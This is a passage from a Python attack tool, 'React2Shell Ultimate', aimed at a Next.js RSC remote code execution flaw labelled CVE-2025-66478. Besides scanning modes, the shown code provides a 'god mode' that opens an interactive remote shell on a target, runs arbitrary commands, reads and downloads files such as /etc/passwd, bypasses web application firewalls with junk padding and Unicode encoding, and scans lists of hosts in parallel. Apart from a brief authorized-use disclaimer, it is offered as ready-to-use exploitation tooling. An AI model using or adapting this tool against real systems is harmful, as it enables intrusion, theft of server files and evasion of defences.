║  Commands:                                                             ║
║    • Type any shell command to execute (ls, whoami, id, cat, etc.)     ║
║    • 'read <file>' - Read file contents (e.g., read /etc/passwd)       ║
║    • 'download <remote> <local>' - Download file to local              ║
║    • 'help' - Show this help                                           ║
║    • 'exit' or 'quit' - Exit interactive shell                         ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}""")

    # First, verify target is exploitable
    print(colorize("[*] Testing target exploitability...", Colors.CYAN))
    success, output = scanner.exploit_execute(
        url, "id",
        windows=windows,
        waf_bypass=waf_bypass,
        waf_bypass_size_kb=waf_bypass_size_kb,
        unicode_encode=unicode_encode
    )

    if success:
        print(colorize(f"[✓] Target is exploitable! User: {output}", Colors.GREEN))
    else:
        print(colorize(f"[!] Target may not be exploitable: {output}", Colors.YELLOW))
        print(colorize("[*] Continuing anyway - some commands may still work...", Colors.YELLOW))

    print()

    history = []

    while True:
        try:
            prompt = f"{Colors.RED}react2shell{Colors.RESET}:{Colors.CYAN}{url.split('//')[1].split('/')[0]}{Colors.RESET}$ "
            cmd = input(prompt).strip()

            if not cmd:
                continue

            if cmd.lower() in ['exit', 'quit', 'q']:
                print(colorize("\n[*] Exiting interactive shell...", Colors.CYAN))
                break

            if cmd.lower() == 'help':
                print(f"""
{Colors.YELLOW}Available Commands:{Colors.RESET}
  {Colors.GREEN}Any shell command{Colors.RESET}     Execute command on target (ls, whoami, cat, etc.)
  {Colors.GREEN}read <filepath>{Colors.RESET}       Read file contents from target
  {Colors.GREEN}download <r> <l>{Colors.RESET}      Download remote file to local path
  {Colors.GREEN}history{Colors.RESET}               Show command history
  {Colors.GREEN}clear{Colors.RESET}                 Clear screen
  {Colors.GREEN}exit/quit{Colors.RESET}             Exit interactive shell
""")
                continue

            if cmd.lower() == 'history':
                if history:
                    print(colorize("\nCommand History:", Colors.YELLOW))
                    for i, h in enumerate(history, 1):
                        print(f"  {i}. {h}")
                else:
                    print(colorize("No command history", Colors.YELLOW))
                print()
                continue

            if cmd.lower() == 'clear':
                os.system('clear' if os.name != 'nt' else 'cls')
                continue

            # Handle read command
            if cmd.lower().startswith('read '):
                filepath = cmd[5:].strip()
                if not filepath:
                    print(colorize("[!] Usage: read <filepath>", Colors.YELLOW))
                    continue

                print(colorize(f"[*] Reading file: {filepath}", Colors.CYAN))
                success, content = scanner.exploit_read_file(
                    url, filepath,
                    waf_bypass=waf_bypass,
                    waf_bypass_size_kb=waf_bypass_size_kb,
                    unicode_encode=unicode_encode
                )

                if success:
                    print(colorize(f"\n{'='*60}", Colors.GREEN))
                    print(colorize(f"File: {filepath}", Colors.GREEN))
                    print(colorize(f"{'='*60}", Colors.GREEN))
                    print(content)
                    print(colorize(f"{'='*60}\n", Colors.GREEN))
                else:
                    print(colorize(f"[✗] Failed to read file: {content}", Colors.RED))

                history.append(cmd)
                continue

            # Handle download command
            if cmd.lower().startswith('download '):
                parts = cmd[9:].strip().split()
                if len(parts) != 2:
                    print(colorize("[!] Usage: download <remote_path> <local_path>", Colors.YELLOW))
                    continue

                remote_path, local_path = parts
                print(colorize(f"[*] Downloading: {remote_path} -> {local_path}", Colors.CYAN))

                success, content = scanner.exploit_read_file(
                    url, remote_path,
                    waf_bypass=waf_bypass,
                    waf_bypass_size_kb=waf_bypass_size_kb,
                    unicode_encode=unicode_encode
                )

                if success:
                    try:
                        with open(local_path, 'w') as f:
                            f.write(content)
                        print(colorize(f"[✓] Downloaded {len(content)} bytes to {local_path}", Colors.GREEN))
                    except Exception as e:
                        print(colorize(f"[✗] Failed to save file: {e}", Colors.RED))
                else:
                    print(colorize(f"[✗] Failed to download: {content}", Colors.RED))

                history.append(cmd)
                continue

            # Execute shell command
            print(colorize(f"[*] Executing: {cmd}", Colors.CYAN))
            success, output = scanner.exploit_execute(
                url, cmd,
                windows=windows,
                waf_bypass=waf_bypass,
                waf_bypass_size_kb=waf_bypass_size_kb,
                unicode_encode=unicode_encode
            )

            if success:
                print(colorize(f"\n{output}\n", Colors.WHITE))
            else:
                print(colorize(f"[✗] Command failed: {output}", Colors.RED))

            history.append(cmd)

        except KeyboardInterrupt:
            print(colorize("\n\n[*] Interrupted. Type 'exit' to quit.", Colors.YELLOW))
        except EOFError:
            print(colorize("\n[*] Exiting interactive shell...", Colors.CYAN))
            break


def run_god_mode(
    scanner: NextJSScanner,
    url: str,
    command: str = None,
    read_file: str = None,
    interactive: bool = False,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
):
    """
    Run god mode - execute commands or read files on vulnerable target.
    For authorized red team assessments only.
    """
    url = normalize_url(url)

    # Interactive shell mode
    if interactive:
        run_interactive_shell(
            scanner, url,
            windows=windows,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
            unicode_encode=unicode_encode
        )
        return

    # Single command execution
    if command:
        print(colorize(f"[*] Executing command: {command}", Colors.CYAN))
        print(colorize(f"[*] Target: {url}", Colors.CYAN))
        if waf_bypass:
            print(colorize(f"[*] WAF Bypass: Enabled ({waf_bypass_size_kb}KB junk data)", Colors.YELLOW))
        if unicode_encode:
            print(colorize("[*] Unicode Encoding: Enabled", Colors.YELLOW))
        print()

        success, output = scanner.exploit_execute(
            url, command,
            windows=windows,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
            unicode_encode=unicode_encode
        )

        if success:
            print(colorize("="*60, Colors.GREEN))
            print(colorize("COMMAND OUTPUT", Colors.GREEN + Colors.BOLD))
            print(colorize("="*60, Colors.GREEN))
            print(output)
            print(colorize("="*60, Colors.GREEN))
            print(colorize(f"\n[✓] Command executed successfully!", Colors.GREEN))
        else:
            print(colorize(f"[✗] Command execution failed: {output}", Colors.RED))
        return

    # File read mode
    if read_file:
        print(colorize(f"[*] Reading file: {read_file}", Colors.CYAN))
        print(colorize(f"[*] Target: {url}", Colors.CYAN))
        print()

        success, content = scanner.exploit_read_file(
            url, read_file,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
            unicode_encode=unicode_encode
        )

        if success:
            print(colorize("="*60, Colors.GREEN))
            print(colorize(f"FILE: {read_file}", Colors.GREEN + Colors.BOLD))
            print(colorize("="*60, Colors.GREEN))
            print(content)
            print(colorize("="*60, Colors.GREEN))
            print(colorize(f"\n[✓] File read successfully! ({len(content)} bytes)", Colors.GREEN))
        else:
            print(colorize(f"[✗] File read failed: {content}", Colors.RED))
        return

    # No specific action - show help
    print(colorize("[!] God mode requires one of: --cmd, --read-file, or --shell", Colors.YELLOW))
    print(colorize("    Example: --god -u https://target.com --cmd 'id'", Colors.WHITE))
    print(colorize("    Example: --god -u https://target.com --read-file '/etc/passwd'", Colors.WHITE))
    print(colorize("    Example: --god -u https://target.com --shell", Colors.WHITE))


# ============================================================================
# MAIN
# ============================================================================

def show_interactive_help():
    """Show beautiful interactive help when no arguments provided."""
    print(f"""
{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║     ____                 _   ___  ____  _          _ _                 ║
║    |  _ \\ ___  __ _  ___| |_|__ \\/ ___|| |__   ___| | |                ║
║    | |_) / _ \\/ _` |/ __| __| / /\\___ \\| '_ \\ / _ \\ | |                ║
║    |  _ <  __/ (_| | (__| |_ / /_ ___) | | | |  __/ | |                ║
║    |_| \\_\\___|\\__,_|\\___|\\__|____|____/|_| |_|\\___|_|_|                ║
║                                                                        ║
║            React2Shell Ultimate CVE-2025-66478 Scanner v{VERSION}         ║
║          Next.js RSC Remote Code Execution Vulnerability               ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}Author: Satyam Rastogi (@hackersatyamrastogi){Colors.CYAN}                        ║
║  {Colors.WHITE}https://github.com/hackersatyamrastogi{Colors.CYAN}                              ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.WHITE}{Colors.BOLD}USAGE:{Colors.RESET}
    python3 react2shell-ultimate.py [OPTIONS] <TARGET>

{Colors.GREEN}{Colors.BOLD}QUICK START EXAMPLES:{Colors.RESET}
{Colors.CYAN}┌─────────────────────────────────────────────────────────────────────────┐{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.YELLOW}# Scan a single URL (comprehensive mode){Colors.RESET}                                {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py -u https://target.com               {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}                                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.YELLOW}# Safe scan (no code execution){Colors.RESET}                                        {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py -u https://target.com --safe        {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}                                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.YELLOW}# RCE proof-of-concept{Colors.RESET}                                                  {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py -u https://target.com --rce         {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}                                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.YELLOW}# Scan multiple targets from file{Colors.RESET}                                      {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py -l targets.txt -t 20                {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}                                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.YELLOW}# Scan local Next.js projects{Colors.RESET}                                          {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py --local /path/to/projects           {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}                                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.YELLOW}# With WAF bypass{Colors.RESET}                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py -u https://target.com --rce --waf-bypass{Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}└─────────────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.MAGENTA}{Colors.BOLD}SCAN MODES:{Colors.RESET}
    {Colors.GREEN}--safe{Colors.RESET}           Safe side-channel detection (no code execution)
    {Colors.GREEN}--rce{Colors.RESET}            RCE proof-of-concept (executes: echo $((41*271)))
    {Colors.GREEN}--version{Colors.RESET}        Version detection only (fastest)
    {Colors.GREEN}--comprehensive{Colors.RESET}  Full scan with all techniques (default)

{Colors.MAGENTA}{Colors.BOLD}WAF BYPASS:{Colors.RESET}
    {Colors.GREEN}--waf-bypass{Colors.RESET}     Add 128KB junk data to bypass content inspection
    {Colors.GREEN}--unicode{Colors.RESET}        Unicode encoding bypass
    {Colors.GREEN}--vercel-bypass{Colors.RESET}  Vercel-specific WAF bypass

{Colors.RED}{Colors.BOLD}GOD MODE (Red Team):{Colors.RESET}
    {Colors.GREEN}--god{Colors.RESET}            Enable god mode for command execution
    {Colors.GREEN}--cmd 'cmd'{Colors.RESET}      Execute single command (e.g., --cmd 'id')
    {Colors.GREEN}--read-file{Colors.RESET}      Read file from target (e.g., --read-file '/etc/passwd')
    {Colors.GREEN}--shell{Colors.RESET}          Interactive shell on vulnerable target

{Colors.CYAN}┌─────────────────────────────────────────────────────────────────────────┐{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.RED}# GOD MODE - Execute commands on vulnerable target{Colors.RESET}                    {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py --god -u https://target.com --cmd 'id'{Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}                                                                       {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.RED}# Interactive shell{Colors.RESET}                                                   {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}│{Colors.RESET}   python3 react2shell-ultimate.py --god -u https://target.com --shell  {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}└─────────────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.WHITE}For full options, run: python3 react2shell-ultimate.py --help{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️  DISCLAIMER:{Colors.RESET} {Colors.WHITE}For authorized security testing only.{Colors.RESET}
""")


def main():
    # Show interactive help if no arguments
    if len(sys.argv) == 1:
        show_interactive_help()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME} - Next.js RSC RCE Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Version detection only (fastest, no exploitation)
  %(prog)s -u https://example.com --version

  # Safe side-channel detection (no RCE execution)
  %(prog)s -u https://example.com --safe

  # RCE proof-of-concept (executes harmless calculation)
  %(prog)s -u https://example.com --rce

  # Comprehensive scan with WAF bypass attempts
  %(prog)s -u https://example.com --comprehensive

  # Scan multiple targets from file
  %(prog)s -l hosts.txt -t 20 -o results.json

  # Local project scanning
  %(prog)s --local /path/to/project

  # With WAF bypass techniques
  %(prog)s -u https://example.com --rce --waf-bypass
  %(prog)s -u https://example.com --rce --vercel-bypass

  # GOD MODE - Actual command execution (authorized red team only)
  %(prog)s --god -u https://target.com --cmd 'id'
  %(prog)s --god -u https://target.com --cmd 'whoami'
  %(prog)s --god -u https://target.com --read-file '/etc/passwd'
  %(prog)s --god -u https://target.com --shell

  # GOD MODE with WAF bypass
  %(prog)s --god -u https://target.com --cmd 'ls -la' --waf-bypass
        """
    )

    # Input options
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("-u", "--url", help="Single URL to scan")
    input_group.add_argument("-l", "--list", help="File with URLs (one per line)")
    input_group.add_argument("--local", metavar="PATH", help="Scan local project directory")

    # Scan mode
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument("--safe", action="store_true",
                           help="Safe side-channel detection (no code execution)")
    mode_group.add_argument("--rce", action="store_true",
                           help="RCE proof-of-concept (executes echo calculation)")
    mode_group.add_argument("--version", action="store_true", dest="version_only",
                           help="Version detection only (HTTP headers)")
    mode_group.add_argument("--comprehensive", action="store_true",
                           help="Full scan: version + safe + RCE with bypasses")

    # WAF bypass options
    parser.add_argument("--waf-bypass", action="store_true",
                       help="Add junk data to bypass WAF inspection")
    parser.add_argument("--waf-bypass-size", type=int, default=128, metavar="KB",
                       help="Junk data size in KB (default: 128)")
    parser.add_argument("--unicode", action="store_true",
                       help="Use Unicode encoding for WAF bypass")
    parser.add_argument("--vercel-bypass", action="store_true",
                       help="Use Vercel-specific WAF bypass")
    parser.add_argument("--windows", action="store_true",
                       help="Use Windows PowerShell payload")

    # God mode options (Red Team)
    parser.add_argument("--god", action="store_true",
                       help="Enable god mode for actual command execution (authorized red team only)")
    parser.add_argument("--cmd", metavar="COMMAND",
                       help="Command to execute in god mode (e.g., --cmd 'id')")
    parser.add_argument("--read-file", metavar="PATH",
                       help="File to read from target in god mode (e.g., --read-file '/etc/passwd')")
    parser.add_argument("--shell", action="store_true",
                       help="Interactive shell on vulnerable target (god mode)")

    # Network options
    parser.add_argument("-t", "--threads", type=int, default=10,
                       help="Number of concurrent threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-k", "--insecure", action="store_true", default=True,
                       help="Disable SSL verification (default: enabled)")
    parser.add_argument("--proxy", help="Proxy URL (http://host:port)")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (can be repeated)")

    # Output options
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("--all-results", action="store_true",
                       help="Save all results, not just vulnerable")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")
    parser.add_argument("-q", "--quiet", action="store_true",
                       help="Only show vulnerable hosts")
    parser.add_argument("--no-color", action="store_true",
                       help="Disable colored output")
    parser.add_argument("--json", action="store_true",
                       help="Output results as JSON to stdout")

    args = parser.parse_args()

    # Disable colors if requested
    if args.no_color or not sys.stdout.isatty():
        for attr in dir(Colors):
            if not attr.startswith('_'):
                setattr(Colors, attr, '')

    # Print banner
    if not args.quiet and not args.json:
        print_banner(god_mode=args.god)

    # Disable SSL warnings
    if args.insecure:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # =========================================================================
    # GOD MODE - Command Execution / File Read / Interactive Shell
    # =========================================================================
    if args.god:
        if not args.url:
            print(colorize("[ERROR] God mode requires a single URL target (-u/--url)", Colors.RED))
            sys.exit(1)

        if not (args.cmd or args.read_file or args.shell):
            print(colorize("[!] God mode requires one of: --cmd, --read-file, or --shell", Colors.YELLOW))
            print(colorize("    Example: --god -u https://target.com --cmd 'id'", Colors.WHITE))
            print(colorize("    Example: --god -u https://target.com --read-file '/etc/passwd'", Colors.WHITE))
            print(colorize("    Example: --god -u https://target.com --shell", Colors.WHITE))
            sys.exit(1)

        # Initialize scanner for god mode
        scanner = NextJSScanner(
            timeout=args.timeout,
            verify_ssl=not args.insecure,
            proxy=args.proxy
        )

        run_god_mode(
            scanner=scanner,
            url=args.url,
            command=args.cmd,
            read_file=args.read_file,
            interactive=args.shell,
            windows=args.windows,
            waf_bypass=args.waf_bypass,
            waf_bypass_size_kb=args.waf_bypass_size,
            unicode_encode=args.unicode
        )
        sys.exit(0)

    # Local project scanning
    if args.local:
        if not args.quiet:
            print(colorize(f"[*] Scanning local project: {args.local}", Colors.CYAN))

        results = scan_local_project(args.local)

        if args.json:
            print(json.dumps([asdict(r) for r in results], indent=2))
        else:
            for result in results:
                if not args.quiet or result.vulnerable:
                    print_result(result, args.verbose)

        if args.output:
            save_results(results, args.output, not args.all_results)

        vulnerable_count = sum(1 for r in results if r.vulnerable)
        if not args.quiet and not args.json:
            print(colorize(f"\n[*] Found {len(results)} Next.js projects, {vulnerable_count} vulnerable",
                          Colors.RED if vulnerable_count else Colors.GREEN))

        sys.exit(1 if vulnerable_count else 0)

    # Remote scanning
    if args.url:
        hosts = [args.url]
    else:
        try:
            with open(args.list) as f:
                hosts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(colorize(f"[ERROR] Failed to read file: {e}", Colors.RED))
            sys.exit(1)

    if not hosts:
        print(colorize("[ERROR] No hosts to scan", Colors.RED))
        sys.exit(1)

    if not args.quiet:
        print(colorize(f"[*] Scanning {len(hosts)} host(s)", Colors.CYAN))
        print(colorize(f"[*] Threads: {args.threads}, Timeout: {args.timeout}s", Colors.CYAN))

    # Initialize scanner
    scanner = NextJSScanner(
        timeout=args.timeout,
        verify_ssl=not args.insecure,
        proxy=args.proxy
    )

    # Determine scan function
    def scan_host(host):
        if args.version_only:
            return scanner.detect_version_http(host)
        elif args.safe:
            result = scanner.scan_safe(host)
            # Also get version
            version_result = scanner.detect_version_http(host)
            result.version = version_result.version
            return result
        elif args.rce:
            result = scanner.scan_rce(
                host,
                windows=args.windows,
                waf_bypass=args.waf_bypass,
                waf_bypass_size_kb=args.waf_bypass_size,
                unicode_encode=args.unicode,
                vercel_bypass=args.vercel_bypass
            )
            version_result = scanner.detect_version_http(host)
            result.version = version_result.version
            return result
        else:  # comprehensive (default)
            return scanner.scan_comprehensive(
                host,
                windows=args.windows,
                try_bypasses=True
            )

    # Run scans
    results = []
    vulnerable_count = 0
    error_count = 0

    if len(hosts) == 1:
        result = scan_host(hosts[0])
        results.append(result)
        if not args.quiet or result.vulnerable:
            if args.json:
                print(json.dumps(asdict(result), indent=2))
            else:
                print_result(result, args.verbose)
        if result.vulnerable:
            vulnerable_count = 1
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan_host, host): host for host in hosts}

            iterator = as_completed(futures)
            if HAS_TQDM and not args.quiet and not args.json:
                iterator = tqdm(iterator, total=len(hosts), desc="Scanning", unit="host")

            for future in iterator:
                result = future.result()
                results.append(result)

                if result.vulnerable:
                    vulnerable_count += 1
                if result.error:
                    error_count += 1

                if not args.quiet or result.vulnerable:
                    if args.json:
                        pass  # Will output at end
                    elif HAS_TQDM:
                        tqdm.write("")
                        print_result(result, args.verbose)
                    else:
                        print_result(result, args.verbose)

    # Output JSON if requested
    if args.json:
        print(json.dumps([asdict(r) for r in results], indent=2))

    # Summary
    if not args.quiet and not args.json:
        print(colorize("=" * 60, Colors.CYAN))
        print(colorize("SCAN SUMMARY", Colors.BOLD))
        print(colorize("=" * 60, Colors.CYAN))
        print(f"  Total hosts: {len(hosts)}")
        vuln_color = Colors.RED + Colors.BOLD if vulnerable_count else Colors.GREEN
        print(f"  {colorize(f'Vulnerable: {vulnerable_count}', vuln_color)}")
        print(f"  Not vulnerable: {len(hosts) - vulnerable_count - error_count}")
        print(f"  Errors: {error_count}")
        print(colorize("=" * 60, Colors.CYAN))

    # Save results
    if args.output:
        save_results(results, args.output, not args.all_results)

    sys.exit(1 if vulnerable_count else 0)


if __name__ == "__main__":
    main()
